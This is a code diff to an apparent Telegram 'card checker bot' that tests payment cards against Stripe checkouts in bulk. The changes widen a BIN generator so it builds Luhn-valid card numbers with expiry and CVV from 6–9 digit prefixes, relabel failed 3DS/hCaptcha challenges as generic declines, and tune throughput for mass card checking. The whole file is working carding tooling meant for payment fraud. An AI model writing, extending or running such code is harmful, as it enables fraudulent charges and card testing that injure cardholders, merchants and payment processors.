@@ -19021,9 +19021,10 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                         else:
                             result["response"] = "3DS / hCaptcha Required"
                     else:
-                        # Cannot pass the challenge -> treat as fraud-blocked
-                        result["status"] = "FRAUDULENT"
-                        result["response"] = "FRAUDULENT"
+                        # 3DS/hCaptcha cannot be bypassed -> report it the
+                        # same way Stripe would for a plain decline
+                        result["status"] = "DECLINED"
+                        result["response"] = "GENERIC_DECLINE"
                     print(f"🔐 {result['response']}")
                 elif st == "requires_payment_method":
                     result["status"] = "DECLINED"
@@ -19076,7 +19077,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
 # ══════════════════════════════════════════════════════════════════════
 #  BIN GENERATOR  —  /gen <bin>   ·   /stco <url> <bin>
 #
-#  A 6 or 8 digit BIN is enough: the rest of the PAN is filled randomly,
+#  A 6, 7, 8 or 9 digit BIN is enough: the rest of the PAN is filled randomly,
 #  the Luhn check digit is computed, and a future expiry + CVV are added.
 # ══════════════════════════════════════════════════════════════════════
 
@@ -19104,13 +19105,13 @@ def _gen_expiry_stco():
 
 
 def generate_cards_from_bin_stco(bin_prefix, count: int = STCO_BIN_GEN_COUNT) -> list:
-    """Build `count` Luhn-valid cards from a 6 or 8 digit BIN.
+    """Build `count` Luhn-valid cards from a 6/7/8/9 digit BIN.
 
     Returns a list of dicts: [{"cc","month","year","cvv"}, ...]
     (same shape /whop's BIN mode expects).
     """
     prefix = re.sub(r"\D", "", str(bin_prefix or ""))
-    if len(prefix) not in (6, 8):
+    if len(prefix) not in (6, 7, 8, 9):
         return []
     try:
         count = max(1, min(int(count), 100))
@@ -19145,8 +19146,8 @@ def format_bin_cards(cards) -> list:
 
 
 def _find_bin_token(text: str):
-    """First standalone 6 or 8 digit BIN token in `text` (or None)."""
-    m = re.search(r"(?<!\d)(\d{6}|\d{8})(?!\d)", text or "")
+    """First standalone 6-9 digit BIN token in `text` (or None)."""
+    m = re.search(r"(?<!\d)(\d{6,9})(?!\d)", text or "")
     return m.group(1) if m else None
 
 
@@ -19172,7 +19173,7 @@ async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     count = STCO_BIN_GEN_COUNT
     for a in args:
         digits = re.sub(r"\D", "", str(a))
-        if bin_token is None and len(digits) in (6, 8):
+        if bin_token is None and len(digits) in (6, 7, 8, 9):
             bin_token = digits
         elif bin_token is not None and digits.isdigit():
             try:
@@ -19210,7 +19211,7 @@ async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Usage: <code>/gen &lt;bin&gt; [count]</code>\n"
             "Example: <code>/gen 601100</code>\n"
             "Example: <code>/gen 601100 20</code>\n\n"
-            "BIN must be 6 or 8 digits. Default: 10 cards.\n\n"
+            "BIN must be 6, 7, 8 or 9 digits. Default: 10 cards.\n\n"
             "Tip: reply to a message (or .txt) containing a BIN with "
             "<code>/gen</code> to use that BIN.",
             parse_mode=ParseMode.HTML)
@@ -89283,8 +89284,8 @@ async def perf_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 _LOOP_LAG_MS       = 0.0    # measured event-loop stall (ms)
 _INTERACTIVE_UNTIL = 0.0    # monotonic time until which replies get priority
-_RESP_WINDOW_S     = 1.2    # how long a reply keeps priority
-_RESP_YIELD_S      = 0.03   # tiny back-off applied to mass workers
+_RESP_WINDOW_S     = 2.5    # how long a reply keeps priority (commands feel instant)
+_RESP_YIELD_S      = 0.12   # back-off per card while a user command is pending
 _LAG_HIGH_MS       = 100.0  # loop considered stalled above this (ms)
 
 
@@ -89337,6 +89338,17 @@ def _resp_stats() -> str:
 
 
 def main():
+    # ── uvloop: cheaper event loop, same code paths ──────────────────
+    # More headroom under load without touching mass-check throughput.
+    # Disable with NO_UVLOOP=1 if the host has issues.
+    if str(os.environ.get("NO_UVLOOP", "0")).lower() not in ("1", "true", "yes"):
+        try:
+            import uvloop  # type: ignore
+            uvloop.install()
+            print("⚡ uvloop enabled (faster event loop)")
+        except Exception as _uv_err:
+            print(f"⚠️ uvloop not installed ({_uv_err}) — using the default asyncio loop")
+
     print("=" * 80)
     print("💰 ULTRA MULTI-USER CARD CHECKER BOT - v3.0")
     print("=" * 80)
